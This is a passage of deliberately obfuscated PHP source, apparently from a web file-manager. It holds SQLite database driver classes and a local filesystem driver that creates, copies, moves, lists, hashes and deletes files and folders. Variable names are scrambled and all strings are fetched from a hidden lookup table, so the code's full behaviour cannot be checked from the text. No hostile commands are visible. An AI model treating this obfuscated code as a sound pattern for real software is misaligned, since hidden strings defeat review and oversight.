$û×ªá‡Î; $Ç¡¥”Ö < count($Õ³¢¥¦€); $Ç¡¥”Ö += 2) { $¸——–èô[$Õ³¢¥¦€[$Ç¡¥”Ö]] = $Õ³¢¥¦€[$Ç¡¥”Ö + 1]; $this->in[$Õ³¢¥¦€[$Ç¡¥”Ö]] = $Õ³¢¥¦€[$Ç¡¥”Ö + 1]; } return $¸——–èô; } protected function assign($ŸÉ•Û‹, $Ì Ï×ŠÚ) { $this->values[$ŸÉ•Û‹] = $Ì Ï×ŠÚ; } protected function display($°Œ·´ºœ) { ob_end_clean(); extract($this->values); require $this->tpl . $°Œ·´ºœ; } } class DbSqliteBase extends Db { public function __construct($ß‹ç×Òñ = '') { $ Ò©„úÅ =& $_SERVER[Ü©»’·]; if (!extension_loaded($ Ò©„úÅ[13])) { think_exception(think_lang($ Ò©„úÅ[14]) . $ Ò©„úÅ[15]); } if (!empty($ß‹ç×Òñ)) { if (!isset($ß‹ç×Òñ[$ Ò©„úÅ[16]])) { $ß‹ç×Òñ[$ Ò©„úÅ[16]] = 438; } $this->config = $ß‹ç×Òñ; if (empty($this->config[$ Ò©„úÅ[17]])) { $this->config[$ Ò©„úÅ[17]] = array(); } } } public function connect($æŞ‘¥©Ø = '', $Ú¿ºª‹ = 0) { $º“Šóó =& $_SERVER[Ü©»’·]; if (!isset($this->linkID[$Ú¿ºª‹])) { if (empty($æŞ‘¥©Ø)) { $æŞ‘¥©Ø = $this->config; } $şâ•ÓÈã = !empty($æŞ‘¥©Ø[$º“Šóó[17]][$º“Šóó[18]]) ? $æŞ‘¥©Ø[$º“Šóó[17]][$º“Šóó[18]] : $this->pconnect; $âØˆŸä¤ = $şâ•ÓÈã ? $º“Šóó[19] : $º“Šóó[20]; $this->linkID[$Ú¿ºª‹] = $âØˆŸä¤($æŞ‘¥©Ø[$º“Šóó[21]], $æŞ‘¥©Ø[$º“Šóó[16]]); if (!$this->linkID[$Ú¿ºª‹]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$Ú¿ºª‹], 30000); if (1 != think_config($º“Šóó[22])) { unset($this->config); } } return $this->linkID[$Ú¿ºª‹]; } public function free() { $this->queryID = null; } public function query($í‹ÏÆ½) { $«©Æñ’ =& $_SERVER[Ü©»’·]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $í‹ÏÆ½; if ($this->queryID) { $this->free(); } think_action_status($«©Æñ’[23], 1); think_status($«©Æñ’[24]); $this->queryID = sqlite_query($this->_linkID, $í‹ÏÆ½); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $Úíìó–¾ = $this->getAll(); return $Úíìó–¾; } } public function execute($úÑñ¤Ã) { $ÖÀô±­¿ =& $_SERVER[Ü©»’·]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $úÑñ¤Ã; if ($this->queryID) { $this->free(); } think_action_status($ÖÀô±­¿[25], 1); think_status($ÖÀô±­¿[24]); $ÄÙÅ½Úú = sqlite_exec($this->_linkID, $úÑñ¤Ã); $this->debug(); if (!1 === $ÄÙÅ½Úú) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[Ü©»’·][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $‚…¶‰ÒŠ = sqlite_query($this->_linkID, $_SERVER[Ü©»’·][27]); if (!$‚…¶‰ÒŠ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $¨Ú¢«ğ¢ = sqlite_query($this->_linkID, $_SERVER[Ü©»’·][28]); if (!$¨Ú¢«ğ¢) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $’Ùö°±½ = array(); if ($this->numRows > 0) { for ($¢®Şø¨Î = 0; $¢®Şø¨Î < $this->numRows; $¢®Şø¨Î++) { $’Ùö°±½[$¢®Şø¨Î] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $’Ùö°±½; } public function getFields($ŸÔå€˜) { $Â§Ä­µ¹ =& $_SERVER[Ü©»’·]; $¢ÂóÖú° = $this->query($Â§Ä­µ¹[29] . $ŸÔå€˜ . $Â§Ä­µ¹[30]); $ŸúÑ·Ã = array(); if ($¢ÂóÖú°) { foreach ($¢ÂóÖú° as $¶ÚÖ¼™™ => $Å¢ÕŸ­…) { $ŸúÑ·Ã[$Å¢ÕŸ­…[$Â§Ä­µ¹[31]]] = array($Â§Ä­µ¹[32] => $Å¢ÕŸ­…[$Â§Ä­µ¹[31]], $Â§Ä­µ¹[33] => $Å¢ÕŸ­…[$Â§Ä­µ¹[34]], $Â§Ä­µ¹[35] => (bool) ($Å¢ÕŸ­…[$Â§Ä­µ¹[36]] === $Â§Ä­µ¹[12]), $Â§Ä­µ¹[37] => $Å¢ÕŸ­…[$Â§Ä­µ¹[38]], $Â§Ä­µ¹[39] => strtolower($Å¢ÕŸ­…[$Â§Ä­µ¹[40]]) == $Â§Ä­µ¹[41], $Â§Ä­µ¹[42] => strtolower($Å¢ÕŸ­…[$Â§Ä­µ¹[43]]) == $Â§Ä­µ¹[44]); } } return $ŸúÑ·Ã; } public function getTables($ÍŞ«À²  = '') { $íÆ¥…´ =& $_SERVER[Ü©»’·]; $¹ïäºÙ™ = $this->query($íÆ¥…´[45] . $íÆ¥…´[46] . $íÆ¥…´[47]); $¸§‚ã = array(); foreach ($¹ïäºÙ™ as $Ï›¤–åÉ => $¿´÷ÃÃâ) { $¸§‚ã[$Ï›¤–åÉ] = current($¿´÷ÃÃâ); } return $¸§‚ã; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $¸÷Í˜¬· =& $_SERVER[Ü©»’·]; $Âö¥æ‡È = sqlite_last_error($this->_linkID); $this->error = $Âö¥æ‡È . $¸÷Í˜¬·[4] . sqlite_error_string($Âö¥æ‡È); if ($¸÷Í˜¬·[12] != $this->queryStr) { $this->error .= LNG($¸÷Í˜¬·[48]) . $this->queryStr; } think_trace($this->error, $¸÷Í˜¬·[12], $¸÷Í˜¬·[49]); return $this->error; } public function escapeString($‡ã®¾Ô) { return sqlite_escape_string($‡ã®¾Ô); } public function parseLimit($êöóŸÑ…) { $†Í³é‰Ÿ =& $_SERVER[Ü©»’·]; $¥šÆ»ªè = $†Í³é‰Ÿ[12]; if (!empty($êöóŸÑ…)) { $êöóŸÑ… = explode($†Í³é‰Ÿ[50], $êöóŸÑ…); if (count($êöóŸÑ…) > 1) { $¥šÆ»ªè .= $†Í³é‰Ÿ[51] . $êöóŸÑ…[1] . $†Í³é‰Ÿ[52] . $êöóŸÑ…[0] . $†Í³é‰Ÿ[53]; } else { $¥šÆ»ªè .= $†Í³é‰Ÿ[51] . $êöóŸÑ…[0] . $†Í³é‰Ÿ[53]; } } return $¥šÆ»ªè; } } class DbSqlite3Base extends Db { public function __construct($§êò”Å¾ = '') { $½ş‚Êˆñ =& $_SERVER[Ü©»’·]; if (!class_exists($½ş‚Êˆñ[54])) { think_exception(think_lang($½ş‚Êˆñ[14]) . $½ş‚Êˆñ[55]); } if (!empty($§êò”Å¾)) { if (!isset($§êò”Å¾[$½ş‚Êˆñ[16]])) { $§êò”Å¾[$½ş‚Êˆñ[16]] = 438; } $this->config = $§êò”Å¾; if (empty($this->config[$½ş‚Êˆñ[17]])) { $this->config[$½ş‚Êˆñ[17]] = array(); } } } public function connect($†¬¡ŞŒ£ = '', $™éêì¿« = 0) { $‚ç¢‘“ =& $_SERVER[Ü©»’·]; if (!isset($this->linkID[$™éêì¿«])) { if (empty($†¬¡ŞŒ£)) { $†¬¡ŞŒ£ = $this->config; } $this->linkID[$™éêì¿«] = new SQLite3($†¬¡ŞŒ£[$‚ç¢‘“[21]]); if (!$this->linkID[$™éêì¿«]) { think_exception($this->linkID[$™éêì¿«]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$™éêì¿«]->busyTimeout(30000); if (1 != think_config($‚ç¢‘“[22])) { unset($this->config); } } return $this->linkID[$™éêì¿«]; } public function free() { $this->queryID = null; } public function query($•†å¸ğ) { $³œ½£”İ =& $_SERVER[Ü©»’·]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $•†å¸ğ; if ($this->queryID) { $this->free(); } think_action_status($³œ½£”İ[23], 1); think_status($³œ½£”İ[24]); $this->queryID = $this->_linkID->query($•†å¸ğ); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $èÜôšÁ¿ = $this->getAll(); $this->numRows = count($èÜôšÁ¿); return $èÜôšÁ¿; } } public function execute($Şû•¼) { $å×Á¨•Å =& $_SERVER[Ü©»’·]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $Şû•¼; if ($this->queryID) { $this->free(); } think_action_status($å×Á¨•Å[25], 1); think_status($å×Á¨•Å[24]); $Ë’ò‚›ö = $this->_linkID->exec($Şû•¼); $this->debug(); if (!1 === $Ë’ò‚›ö) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[Ü©»’·][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Ã»Û²â  = $this->_linkID->query($_SERVER[Ü©»’·][27]); if (!$Ã»Û²â ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $™Ù†¡° = $this->_linkID->query($_SERVER[Ü©»’·][28]); if (!$™Ù†¡°) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $¸ù‡µ°• = array(); while ($ığ“ı» = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $¸ù‡µ°•[] = $ığ“ı»; } $this->queryID->reset(); return $¸ù‡µ°•; } public function getFields($ûÀ´÷Ğæ) { $ˆŒ™›ã¦ =& $_SERVER[Ü©»’·]; $Ùƒ¬«ªß = $this->query($ˆŒ™›ã¦[29] . $ûÀ´÷Ğæ . $ˆŒ™›ã¦[30]); $öĞÎÒ¦ˆ = array(); if ($Ùƒ¬«ªß) { foreach ($Ùƒ¬«ªß as $“Ú¶ò·ß => $Âêçõ¤Ç) { $öĞÎÒ¦ˆ[$Âêçõ¤Ç[$ˆŒ™›ã¦[32]]] = array($ˆŒ™›ã¦[32] => $Âêçõ¤Ç[$ˆŒ™›ã¦[32]], $ˆŒ™›ã¦[33] => $Âêçõ¤Ç[$ˆŒ™›ã¦[33]], $ˆŒ™›ã¦[35] => (bool) ($Âêçõ¤Ç[$ˆŒ™›ã¦[35]] === $ˆŒ™›ã¦[12]), $ˆŒ™›ã¦[37] => $Âêçõ¤Ç[$ˆŒ™›ã¦[56]], $ˆŒ™›ã¦[39] => (bool) $Âêçõ¤Ç[$ˆŒ™›ã¦[57]], $ˆŒ™›ã¦[42] => (bool) $Âêçõ¤Ç[$ˆŒ™›ã¦[57]]); } } return $öĞÎÒ¦ˆ; } public function getTables($í²Á‘ñ† = '') { $¸‰’¸å =& $_SERVER[Ü©»’·]; $Ş“øıï = $this->query($¸‰’¸å[45] . $¸‰’¸å[46] . $¸‰’¸å[47]); $‡ûˆ³ñÎ = array(); foreach ($Ş“øıï as $Ò‡÷«½ï => $óÁ‚£¬•) { $‡ûˆ³ñÎ[$Ò‡÷«½ï] = current($óÁ‚£¬•); } return $‡ûˆ³ñÎ; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $š™ƒø¸› =& $_SERVER[Ü©»’·]; $this->error = $this->_linkID->lastErrorMsg(); if ($š™ƒø¸›[12] != $this->queryStr) { $this->error .= LNG($š™ƒø¸›[48]) . $this->queryStr; } think_trace($this->error, $š™ƒø¸›[12], $š™ƒø¸›[49]); return $this->error; } public function escapeString($ßÛİí¬¾) { $ ß‡¡ =& $_SERVER[Ü©»’·]; if ($this->_linkID) { return $this->_linkID->escapeString($ßÛİí¬¾); } return str_ireplace($ ß‡¡[58], $ ß‡¡[59], $ßÛİí¬¾); } public function parseLimit($è¤ã¨ìÒ) { $Ã™Ô„‹¦ =& $_SERVER[Ü©»’·]; $Ê›¦ü¿‡ = $Ã™Ô„‹¦[12]; if (!empty($è¤ã¨ìÒ)) { $è¤ã¨ìÒ = explode($Ã™Ô„‹¦[50], $è¤ã¨ìÒ); if (count($è¤ã¨ìÒ) > 1) { $Ê›¦ü¿‡ .= $Ã™Ô„‹¦[51] . $è¤ã¨ìÒ[1] . $Ã™Ô„‹¦[52] . $è¤ã¨ìÒ[0] . $Ã™Ô„‹¦[53]; } else { $Ê›¦ü¿‡ .= $Ã™Ô„‹¦[51] . $è¤ã¨ìÒ[0] . $Ã™Ô„‹¦[53]; } } return $Ê›¦ü¿‡; } } goto BË›ŞØà; câ›‘İêÉí: class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($ò÷§é­) { if (substr($ò÷§é­, 0, 2) == $_SERVER[Ü©»’·][1379]) { $ò÷§é­ = BASIC_PATH . substr($ò÷§é­, 2); } return $ò÷§é­; } public function iconvApp($öœ¥ù´¤) { $œ©ØûÜ¬ =& $_SERVER[Ü©»’·]; global $config; return $this->iconvTo($öœ¥ù´¤, $config[$œ©ØûÜ¬[1377]], $config[$œ©ØûÜ¬[1376]]); } public function iconvSystem($¹¼—µŞ€) { $ä²Œå¢ë =& $_SERVER[Ü©»’·]; global $config; return $this->iconvTo($¹¼—µŞ€, $config[$ä²Œå¢ë[1376]], $config[$ä²Œå¢ë[1377]]); } public function getPathOuter($Ì™ü‡ÇÓ) { $ÂûÙ„‘† =& $_SERVER[Ü©»’·]; $ËôùÇ¿Á = $this->iconvApp($this->pathBase); $Ì™ü‡ÇÓ = $this->iconvApp($Ì™ü‡ÇÓ); if (substr($ËôùÇ¿Á, 0, 2) == $ÂûÙ„‘†[1379]) { $ËôùÇ¿Á = BASIC_PATH . substr($ËôùÇ¿Á, 2); } if (substr($Ì™ü‡ÇÓ, 0, 2) == $ÂûÙ„‘†[1379]) { $Ì™ü‡ÇÓ = BASIC_PATH . substr($Ì™ü‡ÇÓ, 2); } $ËôùÇ¿Á = KodIO::clear($ËôùÇ¿Á); $Ì™ü‡ÇÓ = KodIO::clear($Ì™ü‡ÇÓ); $Ì™ü‡ÇÓ = substr($Ì™ü‡ÇÓ, strlen($ËôùÇ¿Á)); if (empty($this->pathDriver)) { return $Ì™ü‡ÇÓ; } return $this->pathDriver . $ÂûÙ„‘†[8] . ltrim($Ì™ü‡ÇÓ, $ÂûÙ„‘†[8]); } public function mkfile($Ê‡î§Ó, $îßØü´œ = '', $‹æ•Ş° = REPEAT_RENAME) { $Ê‡î§Ó = $this->iconvSystem($Ê‡î§Ó); @touch($Ê‡î§Ó); if ($îßØü´œ) { file_put_contents($Ê‡î§Ó, $îßØü´œ); } @chmod($Ê‡î§Ó, $this->pathAuth); return is_file($Ê‡î§Ó) ? $this->getPathOuter($Ê‡î§Ó) : !1; } public function mkdir($šº©»Õ¤, $½Ç»ğ¤É = REPEAT_SKIP) { $šº©»Õ¤ = $this->iconvSystem($šº©»Õ¤); if (is_dir($šº©»Õ¤)) { return $this->getPathOuter($šº©»Õ¤); } @mkdir($šº©»Õ¤, $this->pathAuth, !0); @chmod($šº©»Õ¤, $this->pathAuth); return is_dir($šº©»Õ¤) ? $this->getPathOuter($šº©»Õ¤) : !1; } public function copyFile($ºÁÖŸœ³, $æ¯Ùóß) { $this->mkdir($this->pathFather($æ¯Ùóß)); $ºÁÖŸœ³ = $this->iconvSystem($ºÁÖŸœ³); $æ¯Ùóß = $this->iconvSystem($æ¯Ùóß); $²‘±ŠØ = copy_64($ºÁÖŸœ³, $æ¯Ùóß); @chmod($æ¯Ùóß, $this->pathAuth); return $²‘±ŠØ ? $this->getPathOuter($æ¯Ùóß) : !1; } public function moveFile($è”ûœè, $éâ¯Ï®) { $this->mkdir($this->pathFather($éâ¯Ï®)); $è”ûœè = $this->iconvSystem($è”ûœè); $éâ¯Ï® = $this->iconvSystem($éâ¯Ï®); $‰¿ÂåæÉ = intval(@rename($è”ûœè, $éâ¯Ï®)); if (!$‰¿ÂåæÉ) { if ($‰¿ÂåæÉ = intval(@copy_64($è”ûœè, $éâ¯Ï®))) { @unlink($è”ûœè); } } @chmod($éâ¯Ï®, $this->pathAuth); return $‰¿ÂåæÉ ? $this->getPathOuter($éâ¯Ï®) : !1; } public function movePath($€ì“«ö¾, $Ê™ëÀÌ•, $Û¬Ò³®Ş = false) { $öÕä† =& $_SERVER[Ü©»’·]; $€ì“«ö¾ = $this->iconvSystem($€ì“«ö¾); $Ê™ëÀÌ• = $this->iconvSystem($Ê™ëÀÌ•); $¿È‘¨½Â = rtrim($Ê™ëÀÌ•, $öÕä†[8]) . $öÕä†[8] . ($Û¬Ò³®Ş ? $Û¬Ò³®Ş : get_path_this($€ì“«ö¾)); if (file_exists($¿È‘¨½Â)) { return !1; } $ëâ¸¾©— = intval(@rename($€ì“«ö¾, $¿È‘¨½Â)); $ëâ¸¾©— = file_exists($¿È‘¨½Â); return $ëâ¸¾©— ? $this->getPathOuter($¿È‘¨½Â) : !1; } public function delFile($Õçó£”) { $Õçó£” = $this->iconvSystem($Õçó£”); if (!@unlink($Õçó£”)) { @chmod($Õçó£”, $this->pathAuth); if (!@unlink($Õçó£”)) { return !1; } } else { return !0; } } public function delFolder($œùšØÂ´) { $öÀõÎ®Ğ =& $_SERVER[Ü©»’·]; $œùšØÂ´ = $this->iconvSystem($œùšØÂ´); if (!is_dir($œùšØÂ´)) { return !0; } if (!($ğ¢²İĞ¹ = opendir($œùšØÂ´))) { return !1; } while (($±˜êé¹« = readdir($ğ¢²İĞ¹)) !== !1) { if ($±˜êé¹« == $öÀõÎ®Ğ[10] || $±˜êé¹« == $öÀõÎ®Ğ[1386]) { continue; } $à¶¹ĞÄ˜ = $œùšØÂ´ . $öÀõÎ®Ğ[8] . $±˜êé¹«; if (is_file($à¶¹ĞÄ˜) || is_link($à¶¹ĞÄ˜)) { if (!unlink($à¶¹ĞÄ˜)) { chmod($à¶¹ĞÄ˜, $this->pathAuth); if (!unlink($à¶¹ĞÄ˜)) { return !1; } } } else { if (is_dir($à¶¹ĞÄ˜)) { chmod($à¶¹ĞÄ˜, $this->pathAuth); $à¶¹ĞÄ˜ = $this->iconvApp($à¶¹ĞÄ˜); if (!$this->delFolder($à¶¹ĞÄ˜)) { return !1; } } } } closedir($ğ¢²İĞ¹); return rmdir($œùšØÂ´); } public function rename($Œš†®ß, $‘·µ§µ) { $­°Ã¬°µ =& $_SERVER[Ü©»’·]; $™ë­Æü¬ = $this->fileNameAuto($this->pathFather($Œš†®ß), $‘·µ§µ); $™ë­Æü¬ = $this->iconvSystem($™ë­Æü¬); $Œš†®ß = $this->iconvSystem($Œš†®ß); $¼âÊÎ½Ä = $this->pathFather($Œš†®ß); $êëüıâƒ = rtrim($¼âÊÎ½Ä, $­°Ã¬°µ[8]) . $­°Ã¬°µ[8] . $™ë­Æü¬; $ŸÑÙµ¢Â = @rename($Œš†®ß, $êëüıâƒ); $êëüıâƒ = $this->iconvApp($êëüıâƒ); return $ŸÑÙµ¢Â ? $this->getPathOuter($êëüıâƒ) : !1; } public function size($Üììàœù) { $Üììàœù = $this->iconvSystem($Üììàœù); return filesize_64($Üììàœù); } public function info($±„´«¹) { $±„´«¹ = $this->iconvSystem($±„´«¹); if ($this->isFolder($±„´«¹)) { return $this->folderInfo($±„´«¹); } else { if ($this->isFile($±„´«¹)) { return $this->fileInfo($±„´«¹); } } return !1; } protected function infoChildren($©£Ù±òİ, &$ŸëÕ¥…±, $º°ŠŒÆÏ = true) { $‡„çÒİ® =& $_SERVER[Ü©»’·]; check_abort_echo(); $©£Ù±òİ = rtrim($©£Ù±òİ, $‡„çÒİ®[8]) . $‡„çÒİ®[8]; if ($º°ŠŒÆÏ) { $©£Ù±òİ = $this->iconvSystem($©£Ù±òİ); } if (!($«ßú®Úù = @opendir($©£Ù±òİ))) { return; } while (($ÅÆåóÈ¢ = readdir($«ßú®Úù)) !== !1) { if ($ÅÆåóÈ¢ == $‡„çÒİ®[10] || $ÅÆåóÈ¢ == $‡„çÒİ®[1386]) { continue; } $Îéì­² = $©£Ù±òİ . $ÅÆåóÈ¢; if (is_file($Îéì­²) || is_link($Îéì­²)) { $ŸëÕ¥…±[$‡„çÒİ®[77]]++; $ŸëÕ¥…±[$‡„çÒİ®[76]] += filesize_64($Îéì­²); } else { if (is_dir($Îéì­²)) { $ŸëÕ¥…±[$‡„çÒİ®[78]]++; $this->infoChildren($Îéì­², $ŸëÕ¥…±, !1); } } } closedir($«ßú®Úù); } private function folderInfo($éŞÆÊòó, $õŠ‹ê¹Ù = false) { $Æåˆı =& $_SERVER[Ü©»’·]; $éŞÆÊòó = rtrim($éŞÆÊòó, $Æåˆı[8]) . $Æåˆı[8]; $ì²±²Ó¯ = $this->iconvApp($this->pathThis($éŞÆÊòó)); if ($õŠ‹ê¹Ù) { return array($Æåˆı[32] => $ì²±²Ó¯, $Æåˆı[84] => $this->getPathOuter($éŞÆÊòó), $Æåˆı[33] => $Æåˆı[75]); } $ôÑŒ¾‰¢ = array($Æåˆı[32] => $ì²±²Ó¯, $Æåˆı[84] => $this->getPathOuter($éŞÆÊòó), $Æåˆı[33] => $Æåˆı[75], $Æåˆı[200] => @filectime($éŞÆÊòó), $Æåˆı[85] => @filemtime($éŞÆÊòó), $Æåˆı[1389] => @fileatime($éŞÆÊòó), $Æåˆı[1390] => is_readable($éŞÆÊòó), $Æåˆı[1391] => is_writable($éŞÆÊòó), $Æåˆı[1392] => get_mode($éŞÆÊòó)); return $ôÑŒ¾‰¢; } private function fileInfo($Ë°¬üÖ„, $ã™ÜĞÊ™ = false) { $áşÈ»™Í =& $_SERVER[Ü©»’·]; $ ²ï£“ = $this->iconvApp($this->pathThis($Ë°¬üÖ„)); if ($ã™ÜĞÊ™) { return array($áşÈ»™Í[32] => $ ²ï£“, $áşÈ»™Í[84] => $this->getPathOuter($Ë°¬üÖ„), $áşÈ»™Í[33] => $áşÈ»™Í[199], $áşÈ»™Í[76] => $this->size($Ë°¬üÖ„), $áşÈ»™Í[174] => $this->ext($ ²ï£“)); } $„±ßĞÆ = array($áşÈ»™Í[32] => $ ²ï£“, $áşÈ»™Í[84] => $this->getPathOuter($Ë°¬üÖ„), $áşÈ»™Í[33] => $áşÈ»™Í[199], $áşÈ»™Í[200] => @filectime($Ë°¬üÖ„), $áşÈ»™Í[85] => @filemtime($Ë°¬üÖ„), $áşÈ»™Í[1389] => @fileatime($Ë°¬üÖ„), $áşÈ»™Í[76] => $this->size($Ë°¬üÖ„), $áşÈ»™Í[174] => $this->ext($ ²ï£“), $áşÈ»™Í[1390] => is_readable($Ë°¬üÖ„), $áşÈ»™Í[1391] => is_writable($Ë°¬üÖ„), $áşÈ»™Í[1392] => get_mode($Ë°¬üÖ„)); return $„±ßĞÆ; } public function exist($°«é‰€ª) { $°«é‰€ª = $this->iconvSystem($°«é‰€ª); return @file_exists($°«é‰€ª); } public function isFile($ş’ÕÌòª) { $ş’ÕÌòª = $this->iconvSystem($ş’ÕÌòª); return @is_file($ş’ÕÌòª); } public function isFolder($˜¯ŠÓ¦) { $˜¯ŠÓ¦ = $this->iconvSystem($˜¯ŠÓ¦); return @is_dir($˜¯ŠÓ¦); } public function listPath($‘ùöãª–, $ŸÍË§±ï = false) { $ˆ“—•´¶ =& $_SERVER[Ü©»’·]; $‘ùöãª– = $this->iconvSystem($‘ùöãª–); $‘ùöãª– = rtrim($‘ùöãª–, $ˆ“—•´¶[8]) . $ˆ“—•´¶[8]; $‹˜¹şÜ = array($ˆ“—•´¶[82] => array(), $ˆ“—•´¶[83] => array()); if (!($ö·åõ•¹ = @opendir($‘ùöãª–))) { return $‹˜¹şÜ; } while (($ºˆÏŠ = readdir($ö·åõ•¹)) !== !1) { if ($ºˆÏŠ == $ˆ“—•´¶[10] || $ºˆÏŠ == $ˆ“—•´¶[1386]) { continue; } $™–½æØş = $‘ùöãª– . $ºˆÏŠ; if (is_file($™–½æØş)) { $‹˜¹şÜ[$ˆ“—•´¶[83]][] = $this->fileInfo($™–½æØş, $ŸÍË§±ï); } else { $‹˜¹şÜ[$ˆ“—•´¶[82]][] = $this->folderInfo($™–½æØş, $ŸÍË§±ï); } } closedir($ö·åõ•¹); return $‹˜¹şÜ; } public function listAll($…ÜÆ‘¦ı, &$ÜËªé›ş = array()) { $å‹’¹Ê“ =& $_SERVER[Ü©»’·]; $…ÜÆ‘¦ı = $this->iconvSystem($…ÜÆ‘¦ı); $…ÜÆ‘¦ı = rtrim($…ÜÆ‘¦ı, $å‹’¹Ê“[8]) . $å‹’¹Ê“[8]; if (!($ïÒ‚Œß = @opendir($…ÜÆ‘¦ı))) { return $ÜËªé›ş; } while (($ÙŞı = readdir($ïÒ‚Œß)) !== !1) { if ($ÙŞı == $å‹’¹Ê“[10] || $ÙŞı == $å‹’¹Ê“[1386]) { continue; } $œ°–ˆÔ = $…ÜÆ‘¦ı . $ÙŞı; if (is_dir($œ°–ˆÔ) && !is_link($œ°–ˆÔ)) { $ÜËªé›ş[] = array($å‹’¹Ê“[84] => $œ°–ˆÔ . $å‹’¹Ê“[8], $å‹’¹Ê“[75] => 1, $å‹’¹Ê“[85] => @filemtime($œ°–ˆÔ), $å‹’¹Ê“[76] => 0); $this->listAll($œ°–ˆÔ, $ÜËªé›ş); } else { $ÜËªé›ş[] = array($å‹’¹Ê“[84] => $œ°–ˆÔ, $å‹’¹Ê“[75] => 0, $å‹’¹Ê“[85] => @filemtime($œ°–ˆÔ), $å‹’¹Ê“[76] => $this->size($œ°–ˆÔ)); } } closedir($ïÒ‚Œß); return $ÜËªé›ş; } public function has($µëš¼Ş, $“Ó§úã = false, $Áí˜íØå = true) { $†’ÒÑŠ =& $_SERVER[Ü©»’·]; $µëš¼Ş = $this->iconvSystem($µëš¼Ş); $µëš¼Ş = rtrim($µëš¼Ş, $†’ÒÑŠ[8]) . $†’ÒÑŠ[8]; if (!($çœç±Îˆ = @opendir($µëš¼Ş))) { return !1; } $—ëÈòÈ = 0; $›²•Ä¬ = 0; $àô½ª¥ù = 0; while (($‘¬ÀËú£ = readdir($çœç±Îˆ)) !== !1) { if ($‘¬ÀËú£ == $†’ÒÑŠ[10] || $‘¬ÀËú£ == $†’ÒÑŠ[1386]) { continue; } $àÙÌğ¼ = $µëš¼Ş . $‘¬ÀËú£; if ($“Ó§úã) { $àô½ª¥ù++; if (@is_file($àÙÌğ¼)) { $—ëÈòÈ++; } else { $›²•Ä¬++; } if ($àô½ª¥ù > 10000) { break; } continue; } if ($Áí˜íØå) { if (@is_file($àÙÌğ¼)) { return !0; } } else { if (@is_dir($àÙÌğ¼ . $†’ÒÑŠ[8])) { return !0; } } } closedir($çœç±Îˆ); if ($“Ó§úã) { return array($†’ÒÑŠ[207] => $—ëÈòÈ, $†’ÒÑŠ[208] => $›²•Ä¬); } return !1; } public function hashSimple($µ²æŒ¾) { $ê†±ÄÄº =& $_SERVER[Ü©»’·]; if (!$µ²æŒ¾) { return md5($ê†±ÄÄº[12]); } $µ²æŒ¾ = $this->iconvSystem($µ²æŒ¾); $ğ¸í²Ñì = $this->size($µ²æŒ¾); $ÔÄÙ–Í„ = 200; $Š¨êó€ = 50; if ($ğ¸í²Ñì <= $ÔÄÙ–Í„ * $Š¨êó€) { return $this->hashMd5($µ²æŒ¾) . $ğ¸í²Ñì; } $ƒ¬è„Õˆ = $ê†±ÄÄº[12]; $ ­ÏæÑ¥ = intval($ğ¸í²Ñì / $Š¨êó€); $·¾ùÜ•˜ = fopen($µ²æŒ¾, $ê†±ÄÄº[1393]); if (!$·¾ùÜ•˜) { return $ƒ¬è„Õˆ; } for ($—æ¯ö¬è = 0; $—æ¯ö¬è < $Š¨êó€; $—æ¯ö¬è++) { fseek_64($·¾ùÜ•˜, $ ­ÏæÑ¥ * $—æ¯ö¬è); $ƒ¬è„Õˆ .= fread($·¾ùÜ•˜, $ÔÄÙ–Í„); } fseek_64($·¾ùÜ•˜, $ğ¸í²Ñì - $ÔÄÙ–Í„); $ƒ¬è„Õˆ .= fread($·¾ùÜ•˜, $ÔÄÙ–Í„); fclose($·¾ùÜ•˜); return md5($ƒ¬è„Õˆ) . $ğ¸í²Ñì; } public function getContent($ŞÈıé¨ô) { $ŞÈıé¨ô = $this->iconvSystem($ŞÈıé¨ô); return file_get_contents($ŞÈıé¨ô); } public function setContent($Š‹–×½, $¥÷¶àöŠ = '') { $Š‹–×½ = $this->iconvSystem($Š‹–×½); $öšÄ…ıç = @file_put_contents($Š‹–×½, $¥÷¶àöŠ, LOCK_EX); clearstatcache(); @chmod($Š‹–×½, $this->pathAuth); return $öšÄ…ıç === !1 ? !1 : !0; } public function fileSubstr($€Ê’ÆÜ±, $ô…­ÉåÛ = 0, $‹©‡³—‘ = false) { $´ÈôåÑ =& $_SERVER[Ü©»’·]; $€Ê’ÆÜ± = $this->iconvSystem($€Ê’ÆÜ±); if ($‹©‡³—‘ === !1) { $‹©‡³—‘ = $this->size($€Ê’ÆÜ±); } if ($‹©‡³—‘ <= 0) { return $´ÈôåÑ[12]; } $Âœâ¶ = fopen($€Ê’ÆÜ±, 